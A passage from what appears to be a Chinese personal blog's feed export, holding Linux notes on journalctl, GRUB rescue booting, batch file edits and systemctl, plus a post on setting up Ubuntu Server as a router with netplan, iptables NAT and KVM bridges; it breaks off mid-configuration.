journalctl 查看系统日志</h2><p>系统如果出现问题，那么就需要查看日志。linux系统下所有的日志都存放在&#x2F;var&#x2F;log目录下。查看日志比较简单的方法是使用journalctl，他会把所有的日志都聚合到终端下，方便查看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo journalctl -b -0 <span class="comment">#只查看本次启动的日志</span></span><br><span class="line">$ sudo journalctl -u cups <span class="comment">#查看cups.service这个服务的日志，当排查打印错误相关的错误时有效。小写的u。</span></span><br><span class="line">$ sudo journalctl -S <span class="string">&quot;2021-07-16 12:00:00&quot;</span>  <span class="comment">#查看2021年7月16号中午12点以后的日志</span></span><br><span class="line">$ sudo journalctl -U <span class="string">&quot;2021-07-16 12:00:00&quot;</span> <span class="comment">#查看截至到2021年7月16日中午12点以前的日志。大写的U。</span></span><br></pre></td></tr></table></figure><p>journalctl也可以通过管道和其他的程序配合来使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo journalctl -S <span class="string">&quot;today&quot;</span> |grep cups  <span class="comment">#查看所有今天的和cups管理器有关的日志</span></span><br><span class="line">$ sudo journalctl -S <span class="string">&quot;yesterday&quot;</span> -U <span class="string">&quot;today&quot;</span> |grep cups &gt; <span class="built_in">log</span> <span class="comment">#查看所有从昨天开始到今天为止的和cups有关的日志并且把日志输出到文件log</span></span><br></pre></td></tr></table></figure><h2 id="5-常用的grub命令"><a href="#5-常用的grub命令" class="headerlink" title="5. 常用的grub命令"></a>5. 常用的grub命令</h2><p>在极少数情况下因为grub找不到配置文件，系统无法正常启动而来到grub shell界面。这里教您怎么样处理这种情形。这里以我的笔记本电脑为例，我的电脑是单块硬盘，上面安装了双系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grub&gt;<span class="built_in">ls</span>  <span class="comment">#查看系统磁盘</span></span><br><span class="line">（hd0) (hd0,gpt4) (hd0,gpt3) (hd0,gpt2) (hd0,gpt1)</span><br><span class="line"><span class="comment"># 可以看到我的系统只有一块硬盘hd0,如果有两块硬盘则会出现hd0,hd1，这块硬盘上有四个gpt分区，分别为gpt1,gpt2,gpt3,gpt4（如果是mbr格式的分区表，则会现实为msdos1,msdos2）</span></span><br></pre></td></tr></table></figure><p>知道系统硬盘的情况后，我们需要知道我们存放grub文件的地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt4)/ <span class="comment">#这个命令可以查看硬盘0的第四个分区上的文件情况</span></span><br><span class="line">...</span><br><span class="line">Program Files(x86)</span><br><span class="line">...</span><br><span class="line"><span class="comment">#我们看到了program file分区，所以这个是windows分区，不是我们要找的</span></span><br><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt4) <span class="comment">#如果分区后不带斜杠，则不会显示分区上的文件，而是显示分区的情况</span></span><br><span class="line">分区hd0,gpt4:文件系统ntfs, UUID 947ADB5B7ADB3926 -  分区开始332392448Kib - 总量 167714816Kib</span><br><span class="line"></span><br><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt1)</span><br><span class="line">分区hd0,gpt1:文件系统 fat, UUID 974C-B6C3- 分区开始于 1024KiB - 总量 307200KiB</span><br><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt1)/</span><br><span class="line">efi/</span><br><span class="line">这个分区是fat格式，并且只有一个efi，所一这个分区是efi分区</span><br><span class="line"></span><br><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt2)</span><br><span class="line">分区hd0,gpt2: 文件系统 ext* -  最近更改 2021-07-20 18：36：24 星期二 UUID - 分区开始于 -总量</span><br><span class="line">grub&gt;  <span class="built_in">ls</span> (hd0,gpt2)/</span><br><span class="line">lost+found/ swapfile boto/ bin/  dev/ etc/  home/ lib/ lib32/ lib64/ libx32/ media/ mnt/ opt/ proc/ root/ run/ sbin/ srv/ sys/ tmp/ usr/ var/ Desktop/</span><br><span class="line"><span class="comment">#这个分区为ext，并且有boot,home,usr等分区，所以我们判断这个分区是根分区，我们要进一步查看跟分区下面/boot分区有没有我们想要的</span></span><br><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt2)/boot</span><br><span class="line">config-4.19.0-amd64-desktop  grub                             System.map-4.19.0-amd64-desktop</span><br><span class="line">efi                          initrd.img-4.19.0-amd64-desktop  vmlinuz-4.19.0-amd64-desktop</span><br><span class="line">这个分区有vmlinuz（内核）还有initrd（内存盘），所以这个分区是我们要找的</span><br><span class="line"></span><br><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt3)</span><br><span class="line">grub&gt; <span class="built_in">ls</span> (hd0,gpt3)/</span><br><span class="line"></span><br><span class="line">grub&gt; configfile (hd0,gpt2)/boot/grub/grub.cfg <span class="comment">#使用系统的配置文件</span></span><br><span class="line">回车即可启动</span><br><span class="line">如果上面的不能解决问题，用下面的方法（手动填写配置文件）</span><br><span class="line">grub&gt; <span class="built_in">set</span> root=(hd0,gpt2)</span><br><span class="line">grub&gt; linux /vmlinuz-4.19.0-amd64-desktop root=/dev/sda2  <span class="comment">#指定内核，传递根分区参数</span></span><br><span class="line">grub&gt; initrd /initrd.img-4.19.0-amd64-desktop  <span class="comment">#指定内存盘</span></span><br><span class="line">grub&gt; boot <span class="comment">#启动</span></span><br><span class="line">启动成功后，需要根据实际情况修改/boot/grub/grub.cfg的配置文件里面参数，或者修复文件系统，或者联系统信的技术支持。</span><br></pre></td></tr></table></figure><h2 id="linux查看apk包的信息"><a href="#linux查看apk包的信息" class="headerlink" title="linux查看apk包的信息"></a>linux查看apk包的信息</h2><p>ubuntu 可以使用aapt来查看软件包的信息。</p><p>查看apk的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$aapt</span> dump badging out/target/product/rk3399/system/app/Self-checkout-stage/Self-checkout-stage.apk  |grep versionName</span><br><span class="line">package: name=<span class="string">&#x27;com.michaels.selfcheckout&#x27;</span> versionCode=<span class="string">&#x27;1&#x27;</span> versionName=<span class="string">&#x27;1.4.7.6&#x27;</span> platformBuildVersionName=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>从输出，我们可以看到。包名叫com.michaels.selfcheckout，版本是1.4.7.6。</p><h2 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h2><p><code>grep rk3368 -rn device/rockchip/xxx_name</code></p><p>在当前目录下的device&#x2F;rockchip&#x2F;xxx_name文件夹中递归地搜索包含”rk3368”关键字的文件，并显示匹配行的行号和内容。它用于快速查找与指定关键字相关的内容或文件。</p><p><code>grep -rn NAVICATION_SHOW </code></p><p>查看当前目录的所有子目录文件中名字带有NAVICATION_SHOW的文件</p><p>Linux 使用find指令 查找文件夹下所有子文件夹里面是否存在一个文件</p><p><code>find . -type f -name &quot;a.txt&quot;</code></p><p>.: 表示从当前目录开始进行查找。</p><p>-type f: 限定搜索结果为文件类型。</p><p>-name “a.txt”: 指定要查找的文件名为a.txt。通过使用-name选项和相应的模式匹配来查找文件。</p><h2 id="批量重命名"><a href="#批量重命名" class="headerlink" title="批量重命名"></a>批量重命名</h2><p><code>rename &#39;s/rk3288/new_name/&#39; /path/to/directory/*</code><br>批量将指定文件夹下所有文件 名字带有rk3288的改为新名字 new_name</p><p>sed -i ‘s&#x2F;rk3288&#x2F;new_name&#x2F;g’ &#x2F;path&#x2F;to&#x2F;directory&#x2F;*<br>批量将一个文件夹中所有文件内容中带有rk3288的改为我想要的新名字 new_name<br>-i：这是sed命令的选项之一。它表示直接在原始文件中进行修改。当使用-i选项时，须提供一个后缀作为备份文件的扩展名。例如，如果你想要保留备份文件，可以使用-i.bak。<br>s&#x2F;old&#x2F;new&#x2F;g 代表替换操作。其中：<br>s&#x2F;：表明这是一个替换操作。<br>rk3288：是需要被替换的模式或字符串。<br>new_name：是替换后的新字符串。<br>g：表示全局替换，即一行中所有匹配到的模式都会被替换。</p><h2 id="批量将一个文件夹中所有文件和子文件夹中所有文件内容中带有rk3288的改为我想要的新名字-new-name"><a href="#批量将一个文件夹中所有文件和子文件夹中所有文件内容中带有rk3288的改为我想要的新名字-new-name" class="headerlink" title="批量将一个文件夹中所有文件和子文件夹中所有文件内容中带有rk3288的改为我想要的新名字 new_name"></a>批量将一个文件夹中所有文件和子文件夹中所有文件内容中带有rk3288的改为我想要的新名字 new_name</h2><p><code>find /path/to/folder -type f -exec sed -i &#39;s/rk3288/new_name/g&#39; &#123;&#125; +</code></p><p>批量将一个文件夹中所有文件和子文件夹中所有文件内容中带有rk3288的改为我想要的新名字 new_name</p><p>find &#x2F;path&#x2F;to&#x2F;folder：使用find命令来搜索&#x2F;path&#x2F;to&#x2F;folder路径下的所有文件和子文件夹。</p><p>-type f：-type选项用于指定要搜索的文件类型。在这种情况下，f表示只搜索普通文件，而不包括目录或符号链接。</p><p>-exec sed -i ‘s&#x2F;rk3288&#x2F;new_name&#x2F;g’ {} +：对于每个找到的文件，使用sed命令进行替换操作。</p><p>sed命令是一个流编辑器，可以用来对文本进行各种操作，其中-i选项用于直接修改文件，并且’s&#x2F;rk3288&#x2F;new_name&#x2F;g’是替换操作的表达式。</p><p>s&#x2F;rk3288&#x2F;new_name&#x2F;g表示将文件中所有出现的 “rk3288” 替换为 “new_name”。s是替换操作的命令，g表示全局替换，即替换所有匹配项而不只是第一个。</p><p>{}表示当前找到的文件，+表示将多个文件一次传递给sed命令，以便高效处理。</p><h2 id="systemctl指令"><a href="#systemctl指令" class="headerlink" title="systemctl指令"></a>systemctl指令</h2><p>Linux上有很多服务，可以自己创建一个服务，创建方法为编写一个 *.service文件，然后就可以通过以下指令启动服务了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看所有服务：</span><br><span class="line">systemctl list-units --type=service</span><br><span class="line">这会列出所有正在运行的服务以及它们的状态。</span><br><span class="line"></span><br><span class="line">查看特定服务状态：</span><br><span class="line">systemctl status [service-name].service</span><br><span class="line">用实际的服务名称替换 [service-name]。</span><br><span class="line"></span><br><span class="line">启动服务：</span><br><span class="line">systemctl start [service-name].service</span><br><span class="line">停止服务：</span><br><span class="line">systemctl stop [service-name].service</span><br><span class="line">重启服务：</span><br><span class="line">systemctl restart [service-name].service</span><br><span class="line">启用服务（开机自启）：</span><br><span class="line">systemctl enable [service-name].service</span><br><span class="line">禁用服务（开机不自启）：</span><br><span class="line">systemctl disable [service-name].service</span><br><span class="line">替换上述命令中的 [service-name] 为你要操作的具体服务的名称</span><br></pre></td></tr></table></figure><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>Ubuntu电脑在进行完这几项操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install xorg-video-abi-23</span><br><span class="line">sudo apt install xserver-xorg-core</span><br><span class="line">sudo apt install xserver-xorg-video-intel</span><br></pre></td></tr></table></figure><p>然后重启电脑，发现桌面模式无法进入了，开机界面卡在：<code>/dev/nvme0n1p2: clean, xxxxx/xxxxxxx files, xxxxxx/xxxxxxxxx blocks</code><br>尝试了网上很多方法，都没有生效，最终的解决方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove --purge nvidia-*</span><br><span class="line">sudo apt-get install ubuntu-desktop</span><br><span class="line">sudo rm /etc/X11/xorg.conf</span><br><span class="line">echo &#x27;nouveau&#x27; | sudo tee -a /etc/modules</span><br><span class="line">#重启系统</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>其中真正生效的就是 <code>sudo apt-get install ubuntu-desktop</code> 这个了，重新安装了桌面环境，就能进入桌面了。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu网络配置笔记</title>
    <link href="/2023/11/05/Ubuntu%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/11/05/Ubuntu%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>买了一台服务器，装上了Ubuntu server22.04的系统，想折腾一下这台服务器，让它同时承当软路由的作用，所以还额外买了一个网卡。最开始的网络设置计划如下：</p><p>总路由器 -&gt; 服务器 -&gt; openwrt软路由 -&gt; 自己的路由器 -&gt; 其他终端</p><p>两个网卡如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">enp5s0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        ether 1c:86:0b:21:b6:d9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">enp6s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.6.23  netmask 255.255.255.0  broadcast 192.168.6.255</span><br><span class="line">        inet6 fe80::8e0:afff:feff:6fc  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 0a:e0:af:ff:06:fc  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 32476  bytes 3696355 (3.6 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 81590  bytes 15647027 (15.6 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>从上可以看到enp6s0成功连接了网络，现在我希望将enp6s0作为wan口，另一个enp5s0作为lan口，将我的这个主机另一个网口利用起来，让我网络按照我上面预想的方式进行。</p><h2 id="静态路由配置"><a href="#静态路由配置" class="headerlink" title="静态路由配置"></a>静态路由配置</h2><p>如果自己的一台设备连接的总路由器，另一台设备连接的主机的路由器（二级路由），此时第一台设备是无法ping通第二台的，也就无法通过SSH连接上第二台服务器使用。</p><p>这里需要将主路由器进行路由配置，在路由器的控制台界面</p><ul><li><p>TP-LINK的是 传输控制-&gt;路由设置-&gt;静态路由：新增一条规则</p><ul><li>目的地址：填写子路由的IP地址范围，最后一位是0，例如：192.168.50.0</li><li>子网掩码：255.255.255.0</li><li>下一条：填写子路由在总路由局域网的IP地址，例如：192.168.120.104</li></ul></li><li><p>华硕的是 内部网络（LAN）-&gt;路由设置-&gt;启动静态路由列表：在静态路由列表中新增一条</p><ul><li>网络&#x2F;主机IP：对应上面的目的地址</li><li>子网掩码：255.255.255.0</li><li>网关：对应上面的下一跳</li></ul></li></ul><p>在完成静态路由配置后还是无法ping通，一般是因为二级路由有防火墙设置，在子路由的控制台界面将防火墙关闭即可。</p><p>ps：更简单的方案是把子网统一网段，也就是把二级路由器的dhcp关掉，ip分配通通让一级路由器来干。</p><h2 id="Ubuntu内置软路由"><a href="#Ubuntu内置软路由" class="headerlink" title="Ubuntu内置软路由"></a>Ubuntu内置软路由</h2><p>一般搭建软路由的方式都是通过一个软路由盒子——也就是一个有多网口的终端，这个盒子会装上一个专门用来作为软路由的系统，大多数人同的是openwrt，然后进行配置就可以让OpenWRT管理网络。</p><p>我没有买软路由，这玩意虽然配置一般，但买的话还是得近两百块，所以想了一下，看到过有帖子是可以将虚拟机作为软路由的，我的这个服务器CPU这么多核，内存这么大，不搞几个虚拟机多浪费，所以在Ubuntu中装上了KVM虚拟机。下载镜像后成功创建了一个虚拟机。在虚拟机中一番捣鼓后发现在浏览器输入ip真能进入OpenWRT控制台，但是不管我怎么折腾，控制台始终显示只有一个wan口。也就是说，只有传进来的，没有输出去的。</p><p>这里是第一个需要注意的：KVM虚拟机需要进行网络设置后，其虚拟机才能和宿主机共享网络配置，否则虚拟机里面是拿不到宿主机的配置的。</p><p>第二个就是主机的网络设置，这个也折腾了很久，根据教程做了很多东西，但不一定是有用功</p><h3 id="宿主机网络设置"><a href="#宿主机网络设置" class="headerlink" title="宿主机网络设置"></a>宿主机网络设置</h3><p>启用IP转发： 打开终端并编辑<code>/etc/sysctl.conf</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>找到以下行并确保其没有被注释（即没有以<code>#</code>开头）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>保存并关闭文件。然后加载新的sysctl设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure><p>配置网络接口： 编辑网络接口配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/netplan/your_config_file.yaml</span><br></pre></td></tr></table></figure><p>请将<code>your_config_file.yaml</code>替换为你的实际网络配置文件名，例如<code>01-netcfg.yaml</code>。</p><p>在配置文件中，你需要设置enp6s0作为WAN口，enp5s0作为LAN口。假设你希望将LAN接口的IP地址设置为<code>192.168.5.1</code>，并且子网掩码为<code>255.255.255.0</code>，则配置文件可能如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    enp5s0:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      addresses: [192.168.5.1/24]</span><br><span class="line">    enp6s0:</span><br><span class="line">      dhcp4: yes</span><br></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>应用配置： 应用网络配置更改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure><p>设置NAT规则： 为了实现Internet共享，你需要配置NAT规则，将LAN端口（enp5s0）的流量转发到WAN端口（enp6s0）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -t nat -A POSTROUTING -o enp6s0 -j MASQUERADE</span><br></pre></td></tr></table></figure><p>解释一下这行指令：</p><p>这条命令是用来配置iptables的NAT规则，以实现网络地址转换（Network Address Translation，NAT）功能，通常用于网络共享或路由器配置。让我来详细介绍一下这行语句的含义：</p><ol><li><code>sudo</code>: 这个关键词让命令在超级用户（root）权限下执行，因为iptables规则修改通常需要管理员权限。</li><li><code>iptables</code>: 这是Linux系统上用来配置防火墙规则的命令行工具。</li><li><code>-t nat</code>: <code>-t</code>参数用于指定要操作的iptables表，这里是NAT表。</li><li><code>-A POSTROUTING</code>: <code>-A</code>参数表示添加规则，<code>POSTROUTING</code>是一个NAT表中的链（chain）的名字。在这里，我们将规则添加到POSTROUTING链，该链用于在数据包从本机出去之后、离开网络接口之前处理这些数据包。</li><li><code>-o enp6s0</code>: <code>-o</code>参数用于指定数据包出口的网络接口，这里是<code>enp6s0</code>，也就是WAN口的网络接口。</li><li><code>-j MASQUERADE</code>: <code>-j</code>参数用于指定要采取的操作，这里是<code>MASQUERADE</code>，它是NAT表中的一个目标（target）。<code>MASQUERADE</code>用于将源地址修改为外部网络接口（WAN口）的IP地址，以便允许内部网络（LAN口）的设备通过WAN口进行访问外部互联网。</li></ol><p>综上所述，这条iptables规则的作用是将通过主机的<code>enp6s0</code>网口流出的数据包的源IP地址修改为该网口的IP地址，以实现网络共享或路由功能，允许通过<code>enp5s0</code>网口连接的设备可以访问外部互联网。</p><p>保存iptables规则： Ubuntu 22.04使用<code>nftables</code>作为默认的防火墙管理工具。为了确保iptables规则在重启后仍然有效，你需要将规则保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install iptables-persistent</span><br><span class="line">sudo netfilter-persistent save</span><br></pre></td></tr></table></figure><p>至此，你的Ubuntu Server应该已经配置好了。现在，你可以通过enp5s0连接到你的笔记本，然后共享主机的上网连接。</p><p>请注意，网络共享可能涉及到网络安全风险。确保你的主机有合适的防火墙设置，并且仅允许必要的服务对外开放。</p><h3 id="KVM网络设置"><a href="#KVM网络设置" class="headerlink" title="KVM网络设置"></a>KVM网络设置</h3><p>下一步是配置网桥，前面提到虚拟机是没办法直接用到宿主机的物理网口的，所以需要配置网桥，网桥的作用是将物理接口设置成为网桥的成员，可以让虚拟机使用宿主机的网桥。</p><p>网桥配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line"> version: 2</span><br><span class="line"> renderer: networkd</span><br><span class="line"> ethernets:</span><br><span class="line">   enp1s0:</span><br><span class="line">     dhcp4: yes</span><br><span class="line">   enp2s0:</span><br><span class="line">     dhcp4: yes</span><br><span class="line"> bridges:</span><br><span class="line">   br0:</span><br><span class="line">     interfaces: [enp1s0, enp2s0]</span><br><span class="line">     dhcp4: no</span><br><span class="line">     addresses: [192.168.1.100/24]  # 设置网桥的静态IP地址</span><br><span class="line">     gateway4: 192.168.1.1         # 设置网桥的网关</span><br><span class="line">     nameservers:</span><br><span class="line">       addresses: [8.8.8.8, 8.8.4.4]  # 设置网桥的DNS服务器</span><br></pre></td></tr></table></figure><ol><li><code>version: 2</code> 和 <code>renderer: networkd</code> 表明这是使用<code>netplan</code>网络配置工具，并使用<code>systemd-networkd</code>作为网络管理器的配置。</li><li><code>ethernets</code>部分配置了物理网络接口<code>enp1s0</code>和<code>enp2s0</code>的网络配置：<ul><li><code>enp1s0</code>：设置为使用DHCP协议获取IP地址（<code>dhcp4: yes</code>），这意味着<code>enp1s0</code>会向DHCP服务器请求获取IP地址、网关、DNS等网络配置。</li><li><code>enp2s0</code>：设置为使用DHCP协议获取IP地址（<code>dhcp4: yes</code>），同样，这意味着<code>enp2s0</code>会向DHCP服务器请求获取IP地址、网关、DNS等网络配置。</li></ul></li><li><code>bridges</code>部分配置了网桥接口<code>br0</code>的网络配置：<ul><li><code>interfaces: [enp1s0, enp2s0]</code>：将物理接口<code>enp1s0</code>和<code>enp2s0</code>绑定到网桥接口<code>br0</code>上，创建一个包含两个物理接口的网桥接口。</li><li><code>dhcp4: no</code>：将网桥接口<code>br0</code>的DHCP设置禁用，即不再使用DHCP自动获取IP地址。而是使用静态配置。（我后面感觉这里可以改为yes正确一点）</li><li><code>addresses: [192.168.1.100/24]</code>：设置网桥接口<code>br0</code>的静态IP地址为<code>192.168.1.100</code>，并使用子网掩码<code>/24</code>（即<code>255.255.255.0</code>）。</li><li><code>gateway4: 192.168.1.1</code>：设置网桥接口<code>br0</code>的网关为<code>192.168.1.1</code>。</li><li><code>nameservers: addresses: [8.8.8.8, 8.8.4.4]</code>：设置网桥接口<code>br0</code>的DNS服务器为Google的公共DNS服务器<code>8.8.8.8</code>和<code>8.8.4.4</code>。</li></ul></li></ol><p>在上面的配置中，物理接口<code>enp1s0</code>和<code>enp2s0</code>被设置为使用DHCP获取IP地址，这意味着它们会自动向DHCP服务器请求网络配置信息。然后，这两个物理接口被绑定到一个网桥接口<code>br0</code>上。网桥接口<code>br0</code>的<code>dhcp4</code>设置被禁用（<code>no</code>），这意味着网桥本身不会使用DHCP获取IP地址，而是使用静态配置。</p><p>通过这样的设置，网桥接口<code>br0</code>将使用手动配置的静态IP地址、网关和DNS服务器。同时，所有连接到网桥接口<code>br0</code>上的设备（包括<code>enp1s0</code>和<code>enp2s0</code>）将继承这些静态配置，以便它们在同一网络中运行，具有相同的网络配置。</p><p>配置了网桥之后，物理接口（<code>enp1s0</code>和<code>enp2s0</code>）上的DHCP信息将不再直接生效。在网桥创建并激活后，物理接口不再直接连接到网络，而是成为了网桥的成员。</p><p>当物理接口（<code>enp1s0</code>和<code>enp2s0</code>）加入网桥接口（<code>br0</code>）时，网桥会接管物理接口的配置。此时，物理接口将不再直接与网络交互，它的网络配置会传递给网桥接口，然后网桥接口使用这些配置与网络进行通信。</p><p>网桥的作用是将多个物理接口合并成一个逻辑接口，以实现桥接功能。通过网桥，多个物理接口可以位于同一个网络中，共享相同的网络配置。这对于一些场景（如虚拟化环境、软路由等）非常有用，可以简化网络配置并实现更灵活的网络管理。</p><h3 id="网桥设置步骤："><a href="#网桥设置步骤：" class="headerlink" title="网桥设置步骤："></a>网桥设置步骤：</h3><p>要创建一个网桥，并让网桥的配置完全等于当前物理接口的配置，你可以按照以下步骤进行操作：</p><p><strong>安装所需软件：</strong> 确保你的系统中已经安装了<code>bridge-utils</code>软件包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install bridge-utils</span><br></pre></td></tr></table></figure><p><strong>备份网络配置：</strong> 在更改网络配置前，最好先备份现有的网络配置文件，以便需要时可以恢复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/netplan/01-netcfg.yaml /etc/netplan/01-netcfg.yaml.backup</span><br></pre></td></tr></table></figure><p><strong>编辑网络配置：</strong> 打开网络配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/netplan/01-netcfg.yaml</span><br></pre></td></tr></table></figure><p><strong>配置网桥：</strong> 在文件中添加以下内容来创建网桥接口，并让网桥的配置等于当前物理接口的配置。假设你的物理接口为<code>enp1s0</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yamlCopy codenetwork:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    enp1s0:</span><br><span class="line">      dhcp4: yes   # 根据实际情况，设置为yes或no</span><br><span class="line">  bridges:</span><br><span class="line">    br0:</span><br><span class="line">      interfaces: [enp1s0]</span><br><span class="line">      dhcp4: yes   # 